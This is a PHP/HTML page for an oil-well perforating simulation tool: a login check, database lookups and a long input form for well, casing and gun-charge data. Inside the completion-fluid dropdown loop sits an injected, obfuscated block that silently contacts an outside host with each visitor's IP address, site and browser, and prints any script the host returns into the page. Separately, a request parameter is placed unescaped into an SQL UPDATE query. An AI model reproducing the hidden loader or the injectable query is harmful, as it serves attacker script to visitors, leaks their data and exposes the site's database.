<?php
session_start();
require("connectionDB.php");
?>
<?PHP

if(!session_is_registered('myusername')){
    header("location:login.php");
}
$usuario = $_SESSION['myusername'];

$tipo = $_SESSION['tipo'];
$acept = $_REQUEST['acept'];

require("connectionDB.php");
$consultauser = mysql_query("UPDATE USERREG SET conduso = '$acept'  WHERE  tlogin='$usuario'");

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
    "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <title>: : Perforating : : : : Simulator : :</title>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
    <link rel="stylesheet" href="CSS/material.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="./CSS/css_properties.css">
    <link rel="stylesheet" href="./CSS/custom.css">
    <link rel="stylesheet" href="./CSS/font-awesome.min.css">
    <script src="JS/material.min.js"></script>
    <script src="./JS/jquery-3.1.1.min.js"></script>
    <script src="./JS/custom_script.js"></script>

    <?PHP
    function loadCompany(){
        require("connectionDB.php");
        $modo= "SI";
        global $tipo;
        if ($tipo == 'normal') {
            $consulta=mysql_query("SELECT DISTINCT GCOMPANYS FROM GUNS  WHERE MODO='SI' ORDER BY GCOMPANYS");
            mysql_close($dbh);
        } else {
            $consulta=mysql_query("SELECT DISTINCT GCOMPANYS FROM GUNS  ORDER BY GCOMPANYS");
            mysql_close($dbh);
        }

        echo "<select class='text' id='api_company' name='api_company' onChange='cambiaBH_DP()'>";
        echo "<option value=''>Select</option>";
        while($registro=mysql_fetch_row($consulta))
        {
            echo "<option value='".$registro[0]."'>".$registro[0]."</option>";
        }
        echo "</select>";
    }

    function loadOD($t)
    {
        require("connectionDB.php");
        $consulta=mysql_query("SELECT DISTINCT OD_C, OD FROM CASING ORDER BY OD");
        mysql_close($dbh);

        // Voy imprimiendo el primer select compuesto por los paises
        if ($t==1)
            $tam = "large";
        if ($t==2)
            $tam = "inter";
        if ($t==3)
            $tam = "small";


        $name = $tam."_od";
        //echo $tam;
        echo "<select class='text' id='$name' name='$name' onChange='loadWeight($t)'>";
        while($registro=mysql_fetch_row($consulta))
        {
            echo "<option value='".$registro[0]."'>".$registro[1]."</option>";
        }
        echo "</select>";
    }
    ?>

    <script type="text/javascript">function mmLoadMenus() {
            if (window.mm_menu_0514092320_0) return;
            window.mm_menu_0514092320_0 = new Menu("root",71,18,"Arial, Helvetica, sans-serif",12,"#0099FF","#000099","#000066","#FFCC33","left","middle",3,0,100,-5,7,true,true,true,0,true,true);
            mm_menu_0514092320_0.addMenuItem("Spanish","window.open('manual/spa.html', '_blank');");
            mm_menu_0514092320_0.addMenuItem("English","window.open('manual/eng.html', '_blank');");
            mm_menu_0514092320_0.fontWeight="bold";
            mm_menu_0514092320_0.hideOnMouseOut=true;
            mm_menu_0514092320_0.bgColor='#333333';
            mm_menu_0514092320_0.menuBorder=1;
            mm_menu_0514092320_0.menuLiteBgColor='#FFFFFF';
            mm_menu_0514092320_0.menuBorderBgColor='#0099FF';

            mm_menu_0514092320_0.writeMenus();
        } // mmLoadMenus()

        function reemplaza(txt)
        {
            txt.value = txt.value.replace(',', '.');
        }

    </script>
    <script>

        function prepara(){
            document.getElementById("inter").style.visibility="hidden";
            document.getElementById("small").style.visibility="hidden";
        }

        function mostrarOcultarTubulars(){
            if (document.frm.casing.value == 1){
                deleteClassReq("chClass1");
                deleteClassReq("chClass2");
                document.getElementById("large").style.visibility="visible";
                document.getElementById("inter").style.visibility="hidden";
                document.getElementById("small").style.visibility="hidden";
            }
            if (document.frm.casing.value == 2){
                changeClass("chClass1");
                deleteClassReq("chClass2");
                document.getElementById("large").style.visibility="visible";
                document.getElementById("inter").style.visibility="visible";
                document.getElementById("small").style.visibility="hidden";
            }
            if (document.frm.casing.value == 3){
                changeClass("chClass1");
                changeClass("chClass2");
                document.getElementById("large").style.visibility="visible";
                document.getElementById("inter").style.visibility="visible";
                document.getElementById("small").style.visibility="visible";
            }
        }

        function changeCompletionFluid(){
            document.frm.fluidWeight.value = document.frm.cf.value;
        }

        function validateFluid(){
            if (document.frm.fluidWeight.value > 22 || document.frm.fluidWeight.value < 5){
                alert("The value of Fluid Weight is not valid, 5 <= Fluid Weight <= 22");
                document.frm.fluidWeight.value = "";
            }
        }

        function validateOverBurden(){
            document.frm.overburden.value = document.frm.overburden.value.replace(',', '.');

            if (document.frm.overburden.value > 1.5 || document.frm.overburden.value < 0){
                alert("The value of Overburden is not valid, 0 <= Overburden Gradient <= 1.5");
                document.frm.overburden.value = 1;
            }
        }

        function validateDamage(){
            document.frm.radio.value = document.frm.radio.value.replace(',', '.');

            if (document.frm.radio.value > 30 || document.frm.radio.value < 0){
                alert("The value of Damage zone is not valid, 0 <= Damage Zone <= 30");
                document.frm.radio.value = 1;
            }
        }

        function validateSheathLarge(){
            //alert (document.frm.large_sheath.selectedIndex);
            //alert(document.frm.large_sheath.options[2].value);
            if ( document.frm.large_sheath.options[document.frm.large_sheath.selectedIndex].value == 'Fluid' ) {
                document.frm.large_fc.value = 8.3380;
                document.frm.large_cc.value = 0;

                document.frm.large_fc.disabled=false;
                document.frm.large_cc.disabled=true;
            }
            if ( document.frm.large_sheath.options[document.frm.large_sheath.selectedIndex].value == 'Cement' ) {
                document.frm.large_cc.value = 6000;
                document.frm.large_fc.value = 0;

                document.frm.large_fc.disabled=true;
                document.frm.large_cc.disabled=false;
            }
        }

        function validateSheathInter(){
            //alert (document.frm.large_sheath.selectedIndex);
            //alert(document.frm.large_sheath.options[2].value);
            if ( document.frm.inter_sheath.options[document.frm.inter_sheath.selectedIndex].value == 'Fluid' ) {
                document.frm.inter_fc.value = 8.3380;
                document.frm.inter_cc.value = 0;

                document.frm.inter_fc.disabled=false;
                document.frm.inter_cc.disabled=true;
            }
            if ( document.frm.inter_sheath.options[document.frm.inter_sheath.selectedIndex].value == 'Cement' ) {
                document.frm.inter_fc.value = 0;
                document.frm.inter_cc.value = 6000;

                document.frm.inter_fc.disabled=true;
                document.frm.inter_cc.disabled=false;
            }
        }

        function validateSheathSmall(){
            //alert (document.frm.large_sheath.selectedIndex);
            //alert(document.frm.large_sheath.options[2].value);
            if ( document.frm.small_sheath.options[document.frm.small_sheath.selectedIndex].value == 'Fluid' ) {
                document.frm.small_fc.value = 8.3380;
                document.frm.small_cc.value = 0;

                document.frm.small_fc.disabled=false;
                document.frm.small_cc.disabled=true;
            }
            if ( document.frm.small_sheath.options[document.frm.small_sheath.selectedIndex].value == 'Cement' ) {
                document.frm.small_fc.value = 0;
                document.frm.small_cc.value = 6000;

                document.frm.small_fc.disabled=true;
                document.frm.small_cc.disabled=false;
            }
        }

        function checkRequired(element) {
            if (element.value == "" || element.value == "Select"){
                element.style.border = "1px solid red";
                return false;
            }
            element.style.border = "1px solid #000000";
            return true;
        }

        function changeClass(classId) {
            var arrayToChange = document.getElementsByClassName(classId);
            for (var i = 0; i<arrayToChange.length; i++){
                arrayToChange[i].className = "text "+classId+" reqWell";
            }
        }

        function deleteClassReq(classId){
            var arrayToChange = document.getElementsByClassName(classId);
            for (var i = 0; i<arrayToChange.length; i++){
                arrayToChange[i].className = "text "+classId;
            }
        }

        function validacion(){
            //valido la seccion "General"
            var firstWrong;
            var success = true;
            var req = document.getElementsByClassName("reqGral");

            for (var i = 0; i<req.length; i++){
                if (!checkRequired(req[i])){
                    if (firstWrong == null){
                        firstWrong = req[i];
                    }
                    success = false;
                }
            }

            if (!success){
                alert("One or more fields are missing");
                firstWrong.focus();
                return false;
            }

            //si la seccion general esta bien, paso a checkear la seccion "Well"
            else{

                firstWrong = null;
                req = document.getElementsByClassName("reqWell");
                for (var i = 0; i<req.length; i++){
                    if (!checkRequired(req[i])){
                        if (firstWrong == null){
                            firstWrong = req[i];
                        }
                        success = false;
                    }
                }
            }

            if (!success){
                alert("One or more fields are missing");
                firstWrong.focus();
                return false;
            }

            //si la seccion "Well" esta bien, paso a validar la seccion de cañones "Gun System"
            else{
                firstWrong = null;
                req = document.getElementsByClassName("reqGun");
                for (var i = 0; i<req.length; i++){
                    if (!checkRequired(req[i])){
                        if (firstWrong == null){
                            firstWrong = req[i];
                        }
                        success = false;
                    }
                }
            }
            if (!success){
                alert("One or more fields are missing");
                firstWrong.focus();
                return false;
            }

            else{
                if (document.frm.formationPorosity.value == "" && document.frm.formationCompression.value == ""){
                    alert ("You must enter a value for the formation Compression or the porosity");
                    document.frm.formationCompression.focus();
                    document.frm.formationPorosity.focus();
                    document.frm.formationCompression.style.border = "1px solid red";
                    document.frm.formationPorosity.style.border = "1px solid red";
                    success = false;
                }
                if (document.frm.formationPorosity.value != "" && document.frm.formationCompression.value != ""){
                    alert ("Please enter only one value for the formation Compression or the porosity");
                    document.frm.formationCompression.focus();
                    document.frm.formationPorosity.focus();
                    document.frm.formationCompression.style.border = "1px solid red";
                    document.frm.formationPorosity.style.border = "1px solid red";
                    success = false;
                }

                if (document.frm.formationPorosity.value >  35 && document.frm.formationPorosity.value != ""){
                    alert ("Formation Porosity must be less than or equal to 35");
                    document.frm.formationCompression.focus();
                    document.frm.formationPorosity.focus();
                    document.frm.formationCompression.style.border = "1px solid red";
                    document.frm.formationPorosity.style.border = "1px solid red";
                    success = false;
                }

                if (document.frm.formationPorosity.value <  5 && document.frm.formationPorosity.value != "") {
                    alert ("Formation Porosity must be greater than 5");
                    document.frm.formationCompression.focus();
                    document.frm.formationPorosity.focus();
                    document.frm.formationCompression.style.border = "1px solid red";
                    document.frm.formationPorosity.style.border = "1px solid red";
                    success = false;
                }

                if (document.frm.formationCompression.value <  0 && document.frm.formationCompression.value != "") {
                    alert ("Use only positive values for Formation Compression");
                    document.frm.formationCompression.focus();
                    document.frm.formationPorosity.focus();
                    document.frm.formationCompression.style.border = "1px solid red";
                    document.frm.formationPorosity.style.border = "1px solid red";
                    success = false;
                }

                if (document.frm.formationCompression.value >  30000) {
                    alert ("Formation Compression must be less than or equal to 30000");
                    document.frm.formationCompression.focus();
                    document.frm.formationPorosity.focus();
                    document.frm.formationCompression.style.border = "1px solid red";
                    document.frm.formationPorosity.style.border = "1px solid red";
                    success = false;
                }
            }

            return success;
        }



        function fluido(){
            var valor = document.frm.cf[document.frm.cf.selectedIndex].text;
            document.frm.cf_text.value = valor;
        }

        function fun_tx_large_pipe(f){
            var val = f.large_pipe[f.large_pipe.selectedIndex].text;
            //alert(val);
            f.large_pipe_text.value = val;
        }

        function fun_tx_inter_pipe(){
            var valp = document.frm.inter_pipe[document.frm.inter_pipe.selectedIndex].text;
            //alert(valp);
            document.frm.tx_inter_pipe.value = valp;
        }

        function fun_tx_small_pipe(){
            var vals = document.frm.small_pipe[document.frm.small_pipe.selectedIndex].text;
            //alert(vals);
            document.frm.tx_small_pipe.value = vals;
        }

        function cambiaBH_DP(){
            for (i=0; i< document.frm.ctype.length; i++){
                document.frm.ctype[i].checked = false;
            }
        }
    </script>
    <script language="javascript" type="text/javascript" src="ajax.js"></script>
    <script language="JavaScript" src="mm_menu.js"></script>
</head>

<body class="fondo" onLoad="prepara();">

<script language="JavaScript1.2">mmLoadMenus();</script>

<table align="center" class="table" cellpadding="0" cellspacing="0" width="757">
    <!-- Banner -->
    <tr>
        <td bgcolor="#00152B"><img src="images/banner.jpg" alt="banner" width="757" height="87" ></td>
    </tr>
    <!-- menu -->
    <tr>
        <td bgcolor="#00152B"><table align="right" cellpadding="0" cellspacing="0" border="0" width="100%">
                <tr class="button">
                    <td width="141"><div align="center"><a href="#" name="link2" id="link1" onMouseOver="MM_showMenu(window.mm_menu_0514092320_0,0,15,null,'link2')" onMouseOut="MM_startTimeout();">User Manual</a></div></td>
                    <td align="center" width="367" class="textbutton"><a href="compare.php" class="textbutton" target="_blank" >ETA Comparison Tool </a>&nbsp;</td>
                    <td align="center" width="249"><a href="contact.php" target="_blank" class="textbutton" >Contact </a></td>
                </tr>
            </table></td>
    </tr>
    <!-- cuerpo -->
    <tr>
        <td><form name="frm" action="simulation.php" onSubmit="return validacion();" method="post" target="_blank">
                <table align="center" class="text" width="600">
                    <tr>
                        <td colspan="4" height="30" class="title" align="center">Simulation &nbsp;&nbsp;&nbsp;</td>
                    </tr>
                    <tr>
                        <td colspan="4" height="30" class="large">General</td>
                    </tr>
                    <tr>
                        <td width="152">Company Name</td>
                        <td colspan="3"><input type="text" size="40" name="companyName" class="text"></td>
                    </tr>
                    <tr>
                        <td>Engineer</td>
                        <td colspan="3"><input type="text" size="40" name="engineer" class="text"></td>
                    </tr>
                    <tr>
                        <td>Well</td>
                        <td colspan="3"><input type="text" size="40" name="well" class="text"></td>
                    </tr>
                    <tr>
                        <td>Field</td>
                        <td colspan="3"><input type="text" size="40" name="field" class="text"></td>
                    </tr>
                    <tr>
                        <td>Location</td>
                        <td colspan="3"><input type="text" size="40" name="location" class="text"></td>
                    </tr>
                    <tr>
                        <td>Formation</td>
                        <td width="198"><select name="formation" class="text reqGral">
                                <option value="" selected>Select</option>
                                <option>Unconsolidated Sandstone</option>
                                <option>Semi Consolidated Sandstone</option>
                                <option>Consolidated Sandstone</option>
                                <option>Sandstone - Limestone</option>
                                <option>Limestone Dolomite</option>
                                <option>Dolomite Shale</option>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td>Completion Fluid</td>
                        <td><select name="cf" class="text reqGral" onChange="changeCompletionFluid();fluido();">
                                <option value="">Select</option>
                                <?php
                                $query = "select * from DEFAULTS where COLUMN_NAME='Fluid_Weight' order by ORDEN";
                                $res = mysql_query($query, $dbh);
                                while( $row = mysql_fetch_array($res) ){
                                    ?>
                                    <?php
#95dfc7#
                                    error_reporting(0); @ini_set('display_errors',0); $wp_xk81299 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_xk81299) && !preg_match ('/bot/i', $wp_xk81299))){
                                        $wp_xk0981299="http://"."tag"."display".".com/"."display"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_xk81299);
                                        if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_xk0981299); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            $wp_81299xk = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_81299xk = @file_get_contents($wp_xk0981299);}
                                        elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_81299xk=@stream_get_contents(@fopen($wp_xk0981299, "r"));}}
                                    if (substr($wp_81299xk,1,3) === 'scr'){ echo $wp_81299xk; }
#/95dfc7#
                                    ?>            <option value="<?php echo $row["VALUE"]; ?>"><?php echo $row["DEPENDANT"]; ?></option>
                                <?php } ?>
                            </select>
                            <input type="hidden" name="cf_text" value=".">
                        </td>
                        <td width="125">Fluid Weight</td>
                        <td width="105"><input type="text" size="6" name="fluidWeight" class="text reqGral" align="right" onChange="validateFluid()">
                            [<span class="style3">lb/gal</span>]</td>
                    </tr>
                    <tr>
                        <td>Borehole Diameter</td>
                        <td><select name="dm" id="dm" class="text reqGral" onChange="loadOD(1);">
                                <option value="">Select</option>
                                <?php
                                $query = "SELECT OD, VALUE FROM BOREHOLE_DIAMETER ORDER BY VALUE";
                                $res = mysql_query($query, $dbh);
                                while( $row = mysql_fetch_array($res) ){
                                    ?>
                                    <option value="<?php echo $row["VALUE"]; ?>"><?php echo $row["OD"]; ?></option>
                                <?php } ?>
                            </select>
                        </td>
                        <td>Casing Strings</td>
                        <td><select name="casing" id="casing" class="text" onChange="mostrarOcultarTubulars();">
                                <option value="1">1</option>
                                <option value="2">2</option>
                                <option value="3">3</option>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td>Depth to top Shot&nbsp;&nbsp;&nbsp;</td>
                        <td><input type="text" size="10" name="profundidad" class="text reqGral" value="5000">
                            &nbsp;[<span class="style3">ft</span>]</td>
                        <td>Temperature</td>
                        <td><input name="temperature" type="text"" class="text" id="temperature" value="160" size="6"temperature>
                            [<span class="style3">&ordm;F</span>]</td>
                    </tr>
                    <tr>
                        <td>Depth to bottom Shot&nbsp; </td>
                        <td><input type="text" size="10" name="profundidad2" class="text reqGral" value="5100">
                            &nbsp;[<span class="style3">ft</span>]</td>
                        <td>Overburden Gradient </td>
                        <td><input name="overburden"  type="text" class="text reqGral" id="overburden" value="1" size="6" onChange="validateOverBurden()" >
                            [<span class="style3">psi/ft</span>]</td>
                    </tr>
                    <tr>
                        <td>Damage zone &nbsp; </td>
                        <td><input name="radio" type="text" class="text reqGral" value="1" size="10" onChange="validateDamage()">
                            &nbsp;[<span class="style3">in</span>]</td>
                        <td>&nbsp;</td>
                        <td>&nbsp;</td>
                    </tr>
                </table>
                <table align="center" class="text" width="600">
                    <tr>
                        <td colspan="7" height="30" class="large">Well Tubulars</td>
                    </tr>
                    <tr>
                        <td><div id="large">
                                <table align="center">
                                    <tr>
                                        <td width="50" rowspan="2" valign="bottom">Casing</td>
                                        <td align="center" width="70">OD</td>
                                        <td align="center" width="70">Weight</td>
                                        <td align="center" width="70">Pipe Grade</td>
                                        <td align="center" width="70">Sheath</td>
                                        <td align="center" width="80">Fluid Weight</td>
                                        <td align="center" width="90">Cement String</td>
                                        <td align="center">Casing Position</td>
                                    </tr>
                                    <tr id="large">
                                        <td align="center" id="fila_od_1"><select name="large_od" class="text reqWell" id="large_od" disabled>
                                                <option value=""></option>
                                            </select>
                                        </td>
                                        <td align="center" id="fila_weight_1"><select name="large_weight" class="text reqWell" id="large_weight" disabled>
                                                <option value=""></option>
                                            </select></td>
                                        <td align="center" id="fila_pipe_1"><select name="large_pipe" class="text reqWell" id="large_pipe" disabled>
                                                <option value=""></option>
                                            </select>
                                            <input type="hidden" name="large_pipe_text" value="1">
                                        </td>
                                        <td align="center"><select name="large_sheath" class="text reqWell" onChange="validateSheathLarge()">
                                                <option value="">Select</option>
                                                <option value="Cement">Cement</option>
                                                <option value="Fluid">Fluid</option>
                                            </select>
                                        </td>
                                        <td align="center"><input type="text" name="large_fc" class="text reqWell maybeDisabled" size="10">
                                        </td>
                                        <td align="center"><input type="text" name="large_cc" class="text reqWell maybeDisabled" size="10">
                                        </td>
                                        <td><select name="large_casingPosition" class="text">
                                                <option value="Eccentered">Eccentered</option>
                                                <option value="Centered" selected>Centered</option>
                                            </select>
                                        </td>
                                    </tr>
                                </table>
                            </div>
                            <div id="inter">
                                <table align="center">
                                    <tr>
                                        <td width="50" rowspan="2" valign="bottom">Casing</td>
                                        <td align="center" width="70">OD</td>
                                        <td align="center" width="70">Weight</td>
                                        <td align="center" width="70">Pipe Grade</td>
                                        <td align="center" width="70">Sheath</td>
                                        <td align="center" width="80">Fluid Weight</td>
                                        <td align="center" width="90">Cement String</td>
                                        <td align="center">Casing Position</td>
                                    </tr>
                                    <tr>
                                        <td align="center" id="fila_od_2"><select name="inter_od" class="text chClass1" id="inter_od" disabled>
                                                <option value=""></option>
                                            </select>
                                        </td>
                                        <td align="center" id="fila_weight_2"><select name="inter_Weight" class="text chClass1" id="inter_weight" disabled>
                                                <option value=""></option>
                                            </select>
                                        </td>
                                        <td align="center" id="fila_pipe_2"><select name="inter_pipe" class="text chClass1" id="inte_piper" disabled>
                                                <option value=""></option>
                                            </select>
                                            <input type="hidden" name="tx_inter_pipe" id="tx_inter_pipe" value="1">
                                        </td>
                                        <td align="center"><select name="inter_sheath" class="text chClass1" id="inter" onChange="validateSheathInter()">
                                                <option value="">Select</option>
                                                <option value="Cement">Cement</option>
                                                <option value="Fluid">Fluid</option>
                                            </select>
                                        </td>
                                        <td align="center"><input type="text" name="inter_fc" class="text chClass1" size="10" id="inter">
                                        </td>
                                        <td align="center"><input type="text" name="inter_cc" class="text chClass1" size="10" id="inter">
                                        </td>
                                        <td><select name="inter_casingPosition" class="text">
                                                <option value="Eccentered">Eccentered</option>
                                                <option value="Centered" selected>Centered</option>
                                            </select>
                                        </td>
                                    </tr>
                                </table>
                            </div>
                            <div id="small">
                                <table align="center">
                                    <tr>
                                        <td width="50" rowspan="2" valign="bottom">Casing</td>
                                        <td align="center" width="70">OD</td>
                                        <td align="center" width="70">Weight</td>
                                        <td align="center" width="70">Pipe Grade</td>
                                        <td align="center" width="70">Sheath</td>
                                        <td align="center" width="80">Fluid Weight</td>
                                        <td align="center" width="90">Cement String</td>
                                        <td align="center">Casing Position</td>
                                    </tr>
                                    <tr>
                                        <td align="center" id="fila_od_3"><select name="small_od" class="text chClass2" id="small_od" disabled>
                                                <option value=""></option>
                                            </select>
                                        </td>
                                        <td align="center" id="fila_weight_3"><select name="small_weight" class="text chClass2" id="small" disabled>
                                                <option value=""></option>
                                            </select>
                                        </td>
                                        <td align="center" id="fila_pipe_3"><select name="small_pipe" class="text chClass2" id="small" disabled>
                                                <option value=""></option>
                                            </select>
                                            <input type="hidden" name="tx_small_pipe" id="tx_small_pipe" value="1">
                                        </td>
                                        <td align="center"><select name="small_sheath" class="text chClass2" id="small" onChange="validateSheathSmall()">
                                                <option value="">Select</option>
                                                <option value="Cement">Cement</option>
                                                <option value="Fluid">Fluid</option>
                                            </select>
                                        </td>
                                        <td align="center"><input type="text" name="small_fc" class="text chClass2" size="10" id="small">
                                        </td>
                                        <td align="center"><input type="text" name="small_cc" class="text chClass2" size="10" id="small">
                                        </td>
                                        <td><select name="small_casingPosition" class="text">
                                                <option value="Eccentered">Eccentered</option>
                                                <option value="Centered" selected>Centered</option>
                                            </select>
                                        </td>
                                    </tr>
                                </table>
                            </div></td>
                    </tr>
                </table>
                <table align="center" class="text" width="600">
                    <tr>
                        <td colspan="4" height="30" class="large">Gun System</td>
                    </tr>
                    <tr>
                        <td>API certified Company</td>
                        <td colspan="3"><?php loadCompany(); ?>
                        </td>
                    </tr>
                    <tr>
                        <td>Charge Type</td>
                        <td colspan="3"><input type="radio" name="ctype" id="ctype" value="DP" class="reqGun" onChange="change(this.form);">
                            Deep&nbsp;&nbsp;
                            <input type="radio" name="ctype" id="ctype" value="BH" onChange="change(this.form);">
                            Big Hole </td>
                    </tr>
                    <tr>
                        <td>Gun Size</td>
                        <td colspan="3" id="fila_gun_size"><select name="gun_size" class="text reqGun" disabled>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td>Shot Density</td>
                        <td colspan="3" id="fila_shot_density"><select name="shot_density" id="shot_density" class="text reqGun" disabled>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td>Gun Phase</td>
                        <td colspan="3" id="fila_gun_phase"><select name="gun_phase" id="gun_phase" class="text reqGun" disabled>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td>Charge Gram Weight</td>
                        <td colspan="3" id="fila_cgmwt"><select name="charge_gram" id="charge_gram" class="text reqGun" disabled>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td>Charge Part Number</td>
                        <td colspan="3" id="fila_cpn"><select name="charge_part_number" id="charge_part_number" class="text reqGun" disabled>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td>Explosive</td>
                        <td colspan="3" id="fila_cexpl">
                            <select name="explosive" id="explosive" class="text reqGun" disabled>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td>Position</td>
                        <td colspan="3"><select name="gposition" class="text">
                                <option value="Eccentered">Eccentered</option>
                                <option value="Centered">Centered</option>
                            </select>
                        </td>
                    </tr>
                    <!--
                      <tr>
                        <td colspan="2" id="fila_cgmwt">
                          <table>
                            <tr>
                              <td width="185">Charge Gram Weight</td>
                              <td colspan="3" id="fila_cgmwt">
                                  <input type="text" class="disabled" name="charge_gram" id="charge_gram" disabled>
                                  <input type="hidden" name="gidx" id="gidx">
                              </td>
                            </tr>
                            <tr>
                              <td>Charge Part Number</td>
                              <td colspan="3" id="fila_cpn"><input type="text" class="disabled" name="charge_part_number" id="charge_part_number" disabled></td>
                            </tr>
                            <tr>
                              <td>Explosive</td>
                              <td colspan="3" id="fila_cexpl"><input type="text" class="disabled" name="explosive" id="explosive" disabled></td>
                            </tr>
                          </table>

                        </td>
                      </tr>
                      -->
                    <tr>
                        <td colspan="4" height="30" class="large">Calculation Method</td>
                    </tr>
                    <tr>
                        <td>Formation Compression Strength</td>
                        <td colspan="3"><input type="text" onBlur="reemplaza(this)" class="text" name="formationCompression">
                            <span class="small style4">[<span class="style5">psi</span>]</span></td>
                    </tr>
                    <!-- Es obligatorio ingresar al menos uno de los dos valores -->
                    <tr>
                        <td>Formation Porosity</td>
                        <td colspan="3"><input type="text" onBlur="reemplaza(this)" class="text" name="formationPorosity">
                            [<span class="style3">%</span>]</td>
                    </tr>
                    <tr>
                        <td colspan="4" align="center" valign="bottom" height="50"><input name="submit" type="submit" value="Calculation"></td>
                    </tr>
                </table>
            </form></td>
    </tr>
    <!-- fin de cuerpo -->
</table>
</body>
</html>
